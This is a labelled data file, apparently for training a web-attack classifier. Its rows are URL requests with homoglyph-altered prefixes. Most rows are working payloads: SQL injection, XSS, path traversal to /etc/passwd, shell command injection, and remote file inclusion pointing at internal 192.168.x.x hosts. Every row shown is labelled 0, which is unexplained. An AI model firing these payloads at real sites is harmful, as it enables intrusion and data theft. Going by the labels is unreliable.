sentences 	 labels
/ 𝗊հvu0pdg . htm ?  < meta http-equiv = set-cookie content =  " testchuc = 2100 "  >  	 0
/ ƽk𝘆silver / login . tpl . php ? theme = xxpathxx ?  	 0
/ 𝐬𝕥ring / strings / parameters = '   str =  $  ( echo roezhe )   str1 =  $  {  # str }   if  [  5 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  |  	 0
/ 𝑐𝑔i-bin / index . php ? src = 1 & _common = 1 & time = 1331919011 & action = show_view & module = calendarmodule & view =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  	 0
/ ꜱ𝐭ring / strings / parameters = $  { system ( print (  ` echo lhbytt \ necho  $  (  ( 48 + 0 )  )  \ necho lhbytt \ necho lhbytt `  )  ;  \  \ lhbytt  	 0
/ 𝓱𝖾lp . php ? q = rm ; q81588837 & rem ;  	 0
/ ın𝓬 / service . alert . inc . php ? spl_cfg [ dirroot ]  = xxpathxx ?  	 0
/ jα𑜆ascript / logos . exe  	 0
/  < script > document . cookie =  " testydan = 5106 ;  "  <  / script >  	 0
/ 𝕤𝒕ring / strings / parameters = 1 "  "  )  ; select sleep ( 5 )  and  (  "  " innk "  "  =  "  " innk  	 0
/ 𝓼𝘁ring / id = any ?   set-cookie :  + tamper = 1041264011025374727 & nombre = queso + manchego & precio = 100 & cantidad = 64 & b1 = aadir + al + carrito  	 0
/ 𝓬𝕘i-bin / view_item ? html_file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  	 0
/ ƽ𝓉ring / strings / parameters = < s 	 0
/ 𑣁𝘁ring / strings / parameters = 1 '  |  |  ( select  ' jmhb '  where 1794 = 1794 or 4240 =  ( select 4240 from pg_sleep ( 5 )  )  --  	 0
/ 𝒆𝘅amples / jsp / error / awstatstotals . php ? sort =  "  ]  . phpinfo (  )  . exit (  )  .  $ a [  "  	 0
/ o𑜊𝗌-bin / a1stats / a1disp4 . cgi ?  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 0
/ 𝓼𝐭ring / modo = registro & login = alain & password = -57s5g03 & nombre = sigrid & apellidosa = aranzadi + henkel & email = cliff5 @ fichajes . nom . ms & dni = 61093505p & direccion = moas + s / n ,  +  & ciudad = sax & cp = 22255 & provincia = madrid & ntc = 1364126817729617 & b1 = registrar  	 0
/ 𝙝𝖾lp . php ? q =  & ver & rem ;  	 0
/ 𝕤𝔱ring / strings / parameters = 1 )  where 6472 = 6472 ; call regexp_substring ( repeat ( right ( char ( 3702 )  , 0 )  , 500000000 )  , null )  --  	 0
/ 𝖘𝑡ring / strings / parameters = 1 '  )  where 9317 = 9317 or 6793 =  ( select 6793 from pg_sleep ( 5 )  )  --  	 0
/ ƽꬲarch . php ? config [  " sipssys "  ]  = http :  /  / 192 . 168 . 202 . 118 : 8080 / ghl9il ?  	 0
/ ѕ𝘁ring / strings / parameters = -9810 '  )  where 4361 = 4361 or elt ( 1032 = 1032 , 3623 )  --  	 0
/ 𝒒ᑲ2xy9aw . cgi ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ ꜱ𝑡ring / strings / parameters = 1 )  where 7159 = 7159 ; select count (  *  )  from generate_series ( 1 , 5000000 )  --  	 0
/ 𝔰𝑡ring / strings / parameters = -9286 "  "  )  )  as mfxl where 9348 = 9348 union all select 9348 #  	 0
/ 𝗌𝑡ring / strings / parameters = -9711 '  +  ( select  ' ckpj '  where 8338 = 8338 union all select 8338 --  	 0
/ 𝘀𝐭ring / strings / parameters = 1 %  "  "  ; waitfor delay  ' 0 : 0 : 5 '  and  "  "  %  "  "  =  "  "  	 0
/ 𝖘𝐭ring / strings / parameters = 1 '  |  |  ( select  ' uedk '  where 4655 = 4655 ; waitfor delay  ' 0 : 0 : 5 '  )  |  |  '  	 0
/ 𝔢×amples / jsp / error / kernel / loadkernel . php ? installpath =  / etc / passwd \ x00  	 0
/ 𝟛𝟹y9gcqq . jspa ?  < meta http-equiv = set-cookie content =  " testnvxc = 4301 "  >  	 0
/ 𝐬𝖙ring / strings / parameters = |  | echo $ ifskelzxs $  (  ( 60 + 60 )  )  $  ( echo $ ifskelzxs ) kelzxs "  	 0
/ 𝑡𝖊mplate / default / footer . php ? root_path = xxpathxx ? cmd = ls  	 0
/ 𑣁𝒕ring / strings / parameters = '  echo $ ifshpjbts $  (  ( 68 + 1 )  )  $  ( echo $ ifshpjbts ) hpjbts  	 0
/ 𑣁𝕥ring / strings / parameters = "  >  <  " script "  >  " confirm ( 0 )  "  <  /  " script "  >  	 0
/ nmѡОdo67 . php ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ ƽ𝓉ring / modo = registro & login = man *  ? g ? um & password = 31g1ama6o & nombre = andreas & apellidos = montells + callealt & email = gheorghiu-battaglia @ sanchezgordo . bt & dni = 72380388d & direccion = calle + de + la + ciudad + de + riga + 184 +  & ciudad = holguera & cp = 46669 & provincia = vila & ntc = 4378749164701036 & b1 = registrar  	 0
/ 𑣁𝘵ring / modo = registro & login = jamilahbob @  < script > alert ( paros )  <  / script >  . parosproxy . org & password = e0f2n87a & nombre = virma & apellidos = duch + vilarnau & email = rosamond_aloyshina @ videospornocaseros . aq & dni = 84711932b & direccion = alfredo + donay + 178 ,  +  & ciudad = casas + del + monte & cp = 17650 & provincia = toledo & ntc = 7712379186246495 & b1 = registrar  	 0
/ ѕ𝒕ring / strings / parameters = 1 %  '  )  )  and 6537 = dbms_pipe . receive_message ( chr ( 76 )  |  | chr ( 116 )  |  | chr ( 117 )  |  | chr ( 65 )  , 5 )  and  (  (  '  %  '  =  '  	 0
/ 𝓼𝓉ring / strings / parameters = 1 '  )  )  ; select benchmark ( 5000000 , md5 ( 0x4c4d6142 )  )  and  (  (  ' fegp '  =  ' fegp  	 0
/ 𝑑ԁa2qr7j . fts ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ 𝘁o𝐩 . php ? stuff =  & ver  > q94375741 & rem  	 0
/ 𝖍𝙚lp . php ? q =  \ x0auname  > q71142976  #  	 0
/ ѕ𝙩ring / strings / parameters = | echo rqghqr $  (  ( 90 + 57 )  )  $  ( echo rqghqr ) rqghqr |  	 0
/ 𝖘𝒸ripts / index . php ? act = sm_window & page = event & day = -1 union select 1 , 1332009307 , 1854936082  --  	 0
/ 𝔰𝔱ring / strings / parameters = 1 '  )  as tuhc where 4018 = 4018 or char ( 117 )  |  | char ( 111 )  |  | char ( 105 )  |  | char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  --  	 0
/ j𝘢טascript / intl . exe  	 0
/ 𝚜𝘁ring / modo = registro & login = roanne & password = 3un09o & nombrea = odila & apellidos = bologna & email = prendes @ gia . com . kp & dni = 79531407y & direccion = calle + sor + eulalia ,  + s / n +  & ciudad = pirnigas & cp = 34447 & provincia = madrid & ntc = 0884274340898126 & b1 = registrar  	 0
/ n𝔂𝐯bv05h . cfm ?  < script > document . cookie =  " testftxz = 5980 ;  "  <  / script >  	 0
/ сl𝖆sses / admin_o . php ? absolutepath = xxpathxx  	 0
/ 𝒂𝓰ent_affil . pl ? login =  < script > alert (  " 414256083569 "  )  ;  <  / script >  	 0
/ 𝐬𝙩ring / strings / parameters = '  + if ( benchmark ( 3000000 , md5 ( 1 )  )  , null , null )  , null )   /  *  	 0
/ 𐑈𝕥ring / strings / parameters = "  &  sleep 0  &  &  str =  $  ( echo ybjqlf )   &  &  str1 =  $  {  # str }   &  &   [  6 -eq  $  { str1 }   ]   &  &  sleep 1  \  \  	 0
/ 𝓼𝘁ring / modo = entrar & login = general & pwd = caprifolicea & remember = off /  & b1 = entrar  	 0
/ 𐑈𝓉ring / strings / parameters = -3450 '  where 4478 = 4478 or 9323 = 9323 #  	 0
/ 𝘴𝗍ring / strings / parameters = -1339 )  )  )  union all select 6318 , 6318 , 6318 , 6318 , 6318 , 6318 , 6318 , 6318 , 6318 #  	 0
/ 𐐽𝐠i-bin / pbcgi . cgi ? nikto = joe \ xcamel & email =  < script > alert (  ' vulnerable '  )  ;  <  / script >  	 0
/ 𝓼𝚝ring / str =  $  ( echo lwoknm )   str1 =  $  {  # str }   if  [  7 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  "  	 0
/ 𝘴𝑡ring / strings / parameters = having 1 = 1 #  	 0
/ 𝖘𝓉ring / strings / parameters = < form / action =  ' data : text & sol ; html ,  & lt ; script & gt ; alert ( 1 )  & lt / script & gt '  >  < button > click  /  /  mario  	 0
/  ?  < meta http-equiv = set-cookie content =  " testqpux = 4016 "  >  	 0
/ 𝗌𝓉ring / strings / parameters = 1 '  where 7080 = 7080 or 8514 = benchmark ( 5000000 , md5 ( 0x544d5a4c )  )  #  	 0
/ 𐑈𝓽ring / strings / parameters = 1 '  )  )  )  or 1022 =  ( select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 )  --  	 0
/ nҽ𝗐ticket . php ? lang = xxpathxx  	 0
/ 𝐬𝚝ring / strings / parameters = 1 '  and 8594 =  ( select 8594 from pg_sleep ( 5 )  )  --  	 0
/ 𝔭𝒉pmyadmin / index . php ? search =  < script > alert (  ' cmsimple_search_xss . nasl '  )  ;  <  / script >  & function = search  	 0
/ 𝗍𝟛af3tdz . php3 ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ 𝓼𝖙ring / strings / parameters = < script > settimeout (  / a /  . source  +   / lert /  . source  +   "  ( 1 )  "  )  ;  <  / script >   /  /  using source property for concatenation  	 0
/ ꬲ⤫amples / jsp / sessions / ustorekeeper . pl ? command = goto & file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 0
/ 𝘴𝚝ring / strings / parameters = $  { exec ( print (  ` echo srpmsx `  .  ` echo  $  (  ( 59 + 33 )  )  `  .  ` echo srpmsx `  .  ` echo srpmsx `  )  )  } srpmsx  	 0
/ m𝒂ιn . php ? logout =  "  & rm \ x0bq19661861 & rem \ x0b  	 0
/ _𝔞ᑯministration / securite . php ? cfg [ document_uri ]  = xxpathxx  	 0
/ 𑣁𝑡ring / strings / parameters = "   str =  $  ( echo rspyhg )   str1 =  $  {  # str }   if  [  5 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  &  	 0
/ 𝖘𝓉ring / modo = entrar & login = k / lashins & pwd = preconizac ! in & remember = off & b1 = entrar  	 0
/ հj𝖽zm96v . do ?  < script > document . cookie =  " testbyqe = 7474 ;  "  <  / script >  	 0
/ 𝖘𝐭ring / strings / parameters = -8258 "  "  )  )  as swjp where 2681 = 2681 union all select 2681 , 2681 , 2681 , 2681 , 2681 , 2681 --  	 0
/ ϲ𝚐i-bin / index . php ? site =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  	 0
/ 𝚎хamples / jsp / cal / sources / functions . php ? root_path =  / etc / passwd \ x00  	 0
/ 𝔰𝚝ring / strings / parameters = "  | echo cctrqp $  (  ( 48 + 16 )  )  $  ( echo cctrqp ) cctrqp '  	 0
/ 𝗌𝔱ring / strings / parameters = 1 %  "  "  )  and 8594 =  ( select 8594 from pg_sleep ( 5 )  )  --  	 0
/ ѕ𝓉ring / id = 3 /  & nombre = jamn + ibrico & precio = 100 & cantidad = 41 & b1 = aadir + al + carrito  	 0
/ 𑣁𝓉ring / strings / parameters = "  |  | echo qdyned $  (  ( 79 + 86 )  )  $  ( echo qdyned ) qdyned /  /  	 0
/ 𝖙𝘦mplate / default / test / header . php ? root_path = xxpathxx ? cmd = ls  	 0
/ 𝚜𝑡ring / strings / parameters = < maction actiontype =  " statusline "  xlink : href =  " javascript : alert ( 3 )  "  > clickme < mtext > http :  /  / http :  /  / google . com <  / mtext >  <  / maction >  	 0
/ 𝗍o𝗽 . php ? stuff =  "  & ping \ x0c-w \ x0c9000 \ x0c-n \ x0c1 \ x0c1 . 2 . 3 . 4 & rem \ x0c  	 0
/ 𝔰𝑡ring / strings / parameters = 1 )  as drgs where 1989 = 1989 order by 1 --  	 0
/ 𝗌𝘁ring / strings / parameters = < x : script xmlns : x =  " http :  /  / www . w3 . org / 1999 / xhtml "  > alert ( 1 )  ;  <  / x : script >  	 0
/ 𑣁𝖙ring / id = 2 & nombre = queso + manchego & precio = 100 /  & cantidad = 28 & b1 = aadir + al + carrito  	 0
/ j𝐚𝘷ascript / setting . exe  	 0
/ 𑣁𝓉ring / strings / parameters = < script for = _ event = onerror (  )  > confirm (  /  @ ma1 /  )  <  / script >  < img id = _ src =  >  	 0
/ 𝖘𝗍ring / strings / parameters = ;  str =  $  ( echo gfxuis )  ;  str1 =  $  {  # str }  ;  if  [  6 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  #  	 0
/ 𝘴𝓉ring / strings / parameters = 1 )  where 9683 = 9683 ; select  ( case when  ( 1082 = 6755 )  then 1082 else 1082 *  ( select 1082 from mysql . db )  end )  #  	 0
/ 𝔰𝕥ring / strings / parameters = 1 )  ; select like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  	 0
/ ѕm𝔤_smxcfg30 . exe ? vcc = 3560121183d3  	 0
/ n𝓪𝗍ional lampoon ' s christmas vaction /  	 0
/ oƷ𝟱zot2r . php3 ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ 𑣁𝙩ring / modo = registro & login = mitsui & password = d2s3o1nil2ar & nombre = tea & apellidos = cabrera + noguera & email = holzer-hammersley4 @ discon . in & dni = 7645b6096bw & direccion = guadamacil ,  + 198 ,  +  & ciudad = torrejoncillo & cp = 08779 & provincia = teruel & ntc = 4706372444418662 & b1 = registrar  	 0
/ 𝔰𝓽ring / strings / parameters = 1 '  )  waitfor delay  ' 0 : 0 : 5 '  --  	 0
/ 𐑈𝙩ring / strings / parameters = 1 '  |  |  ( select  ' cclo '  from dual where 6823 = 6823 and 9198 = 9198 --  	 0
/ zⅴ𝟠tv7h8 . html ?  < script > document . cookie =  " testcqwz = 9752 ;  "  <  / script >  	 0
/ 𝖈𝒶lendar . php ? year =  < script > alert ( document . cookie )  ;  <  / script >  & month = 03 & day = 05  	 0
/ 𝔰𝕖arch . pl ? form =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  	 0
/ 𝒔𝔱ring / strings / parameters = order by 12 --  	 0
/ ɑᴡstats / awstats . pl ? migrate =  | echo ; chmod 777  / tmp / jbqahurnly . sh ; echo | awstats912357 . txt  	 0
/ 𝓈𝕥ring / errormsg =  '  ,  ' 0 '  ,  ' 0 '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  	 0
/ 𝔰𝘁ring / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo uftnka )   &  &  str1 =  $  {  # str }   &  &   [  5 -eq  $  { str1 }   ]   &  &  sleep 1  #  	 0
/ 𝐬𝑡ring / strings / parameters = 1 '  )  as scnn where 9274 = 9274 ; call regexp_substring ( repeat ( right ( char ( 3702 )  , 0 )  , 500000000 )  , null )  --  	 0
/ 𝗰𝑔i-915 / ustorekeeper . pl ? command = goto & file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 0
/ 𝓈𝘁ring / strings / parameters = 1 '  where 7464 = 7464 and 2388 = benchmark ( 5000000 , md5 ( 0x6d457153 )  )  #  	 0
/ 𝓼𐐽ripts / app_and_readme / navigator / index . php ? page = http :  /  / 192 . 168 . 202 . 96 : 8080 / vir0v3xfc ?  	 0
/ 𝚜𝔱ring / strings / parameters = 1 "  "  where 4161 = 4161 and 8148 = like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  --  	 0
/ ѕ𝔱ring / strings / parameters = 1 , updatexml ( 2917 , concat ( 0x2e , 0x7171706a71 ,  ( select  ( elt ( 2917 = 2917 , 1 )  )  )  , 0x717a767a71 )  , 8295 )  	 0
/ ꜱ𝓽ring / strings / parameters = 1 "  "  )  union all select null , null , null , null , null , null , null , null --  	 0
/ 𝐞𝖌2u8pbv . cfc ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ 𝒻𝓬gi-bin / htimage . exe / path / filename ? 2 , 2  	 0
/ 𝓈𝓉ring / strings / parameters = 1 and updatexml ( 3393 , concat ( 0x2e , 0x7171706a71 ,  ( select  ( elt ( 3393 = 3393 , 1 )  )  )  , 0x717a767a71 )  , 1161 )  	 0
/ 𝓈𝓉ring / modo = registro & login = soliman & password = 85r7a4c2 & nombre = shiirly & apellidos = margarit + gallardo & email = asther @ ringringrent . bj & dni = 718619a7p & direccion = navalafuente ,  + 42 +  & ciudad = santa + cruz + de + pinares & cp = 37510 & provincia = zaragoza & ntc = 6014094757095594 & b1 = registrar  	 0
/ 𝑠𝓉ring / strings / parameters = 1 "  "  )  )  or 9643 =  ( select count (  *  )  from domain . domains as t1 , domain . columns as t2 , domain . tables as t3 )  and  (  (  "  " ampn "  "  like  "  " ampn  	 0
/ 𐑈𝓽ring / strings / parameters = ;  str =  $  ( echo ytwfpg )  ;  str1 =  $  {  # str }  ;  if  [  2 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  /  /  	 0
/ р𝙝pmyadmin / documentation . html ? phpmyadmin =  / etc / passwd  	 0
/  ˈ  .  $ _server [  ' php_self '  ]  .  '  ? act = img & img = delete  	 0
/ ѕ𝗰ripts / base_local_rules . php ? dir =  < script > alert (  ' base_local_rules_xss . nasl-1331908817 '  )  <  / script >  	 0
/ 𝑠𝚝ring / strings / parameters = echo nwxhah $  (  ( 8 + 91 )  )  $  ( echo nwxhah ) nwxhah \  \  	 0
/ 𝙩o𝓹 . php ? stuff =  " del \ x0cq81327195 & rem \ x0c  	 0
/ 𝔰𝖙ring / strings / parameters = 1 "  "  union all select null , null , null , null , null , null #  	 0
/ ƽ𝕥ring / strings / parameters = 1 "  "  )  )  )  and 3707 =  ( select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 )  and  (  (  (  "  " jgoq "  "  =  "  " jgoq  	 0
/ m𝐚nɑger / awstatstotals . php ? sort =  "  ]  . phpinfo (  )  . exit (  )  .  $ a [  "  	 0
/ n୨᙮lumt5 . jsp ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ 𝚌𝒈i-perl / gwweb . exe ? help = bad-request  	 0
/ ੧o𝟼g5vkn . jspa ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ 𝚌ցis / nph-showlogs . pl ? files =  .  .  /  .  .  /  & filter =  .  *  & linecnt = 500 & refresh = 0 & submit = go  	 0
/ 𝚜𝘵ring / strings / parameters = -8929 '  union all select 5324 , 5324 , 5324 , 5324 , 5324 , 5324 --  	 0
/ ѕ𝓽ring / strings / parameters = |  | echo $ ifsbudoyz $  (  ( 31 + 53 )  )  $  ( echo $ ifsbudoyz ) budoyz '  	 0
/ 𝖘𝑡ring / strings / parameters = &  & echo feylrm $  (  ( 81 + 59 )  )  $  ( echo feylrm ) feylrm '  	 0
/ ρ𝚑pmyadmin / documentation . html ? phpmyadmin = map47fckapd3c2j9d7svslcjakhdm1fs '  and sleep ( 4 )  =  '  	 0
/ 𝓼𝘵ring / strings / parameters = &  sleep 0  &  &  str =  $  ( echo ghgvor )   &  &  str1 =  $  {  # str }   &  &   [  9 -eq  $  { str1 }   ]   &  &  sleep 1  #  	 0
/ ⅆ𝘀lpwt15 . exe ?  < script > document . cookie =  " testtkio = 5454 ;  "  <  / script >  	 0
/ 𝑒𝓍amples / jsp / cal / webdist . cgi ? distloc =  ; id  	 0
/ 𝓼𝘵ring / strings / parameters = echo $ ifsrherrd $  (  ( 18 + 82 )  )  $  ( echo $ ifsrherrd ) rherrd '  	 0
/ 𝗲𝙪ropean ' no ' tosoftwarepatentdirectiveleavesdoorsopentoprotectionofnewideas /  	 0
/ 𝘱𝗁pmyadmin / man-cgi ? section = 0 & topic = ls ; id  	 0
/ 𝗯n𝟾57frh . kspx ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ l𝘀o𝑖x5h3 . php3 ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ 𝘴𝓉ring / strings / parameters = )  )  )  )  waitfor delay  ' 0 : 0 : 20 '   /  *  	 0
/ 𝚜𝕥ring / strings / parameters = <  / template >  	 0
/ 𝚜𝓽ring / strings / parameters = ;  str =  $  ( echo pgaqqt )  ;  str1 =  $  {  # str }  ;  if  [  1 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  /  /  	 0
/ 𝐛۱q8bywu . exe ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ 𝓈𝕥ring / modo = entrar & login = hironaga & pwd = 130c & remember = on & b1 =  "  >  <  !  --  # exec + cmd =  " dir +  "  --  >  <  	 0
/ г𝖺ndshop / index . php ? incl = xxpathxx ?  	 0
/ 𝘀𝒕ring / errormsg = credenciales + incorrectasand + 1 = 1  	 0
/ 𝒔𝒕ring / strings / parameters = 1 "  "  )  ; if ( 3831 = 9321 )  select 3831 else drop function ybru --  	 0
/ 𝔢𝔁amples / jsp / cal / index . php ? id =  ' union /  *  *  / select /  *  *  / 0 , 0 , 1645029612 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 --  	 0
/ j𝓪ѵascript /  . passwd . stackdump  	 0
/ 𝒕𝚑eme / test3 . php ? root = xxpathxx  	 0
/ j𝑎𝚟ascript / del . exe  	 0
/ 𝙚𝔵amples / jsp / jsp2 / jspx / ion-p . exe ? page = c :  \  \ winnt \  \ win . ini  	 0
/ ս৪yiqilu . jsp ?  < script > document . cookie =  " testswjp = 6010 ;  "  <  / script >  	 0
/ 𝑠𝖙ring / strings / parameters = 1 '  )  )  )  or 7552 =  ( select count (  *  )  from rdb $ fields as t1 , rdb $ types as t2 , rdb $ collations as t3 , rdb $ functions as t4 )  and  (  (  (  ' iaud '  =  ' iaud  	 0
/ 𝔰𝖙ring / strings / parameters = < xss style =  " xss : expression ( javascript : alert ( 1 )  )  "  >  	 0
/ 𝕤𝘵ring / strings / parameters = '  ;  str =  $  ( echo ueoozq )  ;  str1 =  $  {  # str }  ;  if  [  2 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  "  	 0
/ 𝒑𝐡pmyadmin / documentation . html ? phpmyadmin =  "  >  < script  >  alert ( 201 )  ;   <  / script  >  	 0
/ ƽ𝗍ring / strings / parameters = 1 and 3754 =  ( select upper ( xmltype ( chr ( 60 )  |  | chr ( 58 )  |  | chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  |  | chr ( 62 )  )  )  from dual )  #  sipo  	 0
